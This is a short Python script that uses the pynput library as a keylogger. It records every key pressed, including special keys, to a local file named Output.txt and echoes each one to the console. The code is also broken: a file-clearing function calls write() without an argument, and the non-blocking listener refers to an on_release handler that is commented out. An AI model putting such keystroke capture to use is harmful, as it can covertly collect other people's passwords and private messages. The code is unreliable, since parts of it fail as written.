from pynput import keyboard

def on_press(key):
    file1 = open("Output.txt","a")
    try:
        print('alphanumeric key {0} pressed'.format(
            key.char))
        file1.write('{0}\n'.format(key.char))
    except AttributeError:
        print('special key {0} pressed'.format(
            key))
        file1.write('{0}\n'.format(
            key))
    finally:
        file1.close()

#def on_release(key):
#    file1 = open("Output.txt","a")
#    print('{0} released'.format(
#        key))
#    file1.write('{0} released\n'.format(
#        key))
#    file1.close()
#    if key == keyboard.Key.esc:
        # Stop listener
#        return False

def clearFile():
    file1 = open("Output.txt","w")
    file1.write()
    file1.close()
    
# Collect events until released
with keyboard.Listener(
        on_press=on_press) as listener:
    listener.join()

# ...or, in a non-blocking fashion:
listener = keyboard.Listener(
    on_press=on_press,
    on_release=on_release)
listener.start()
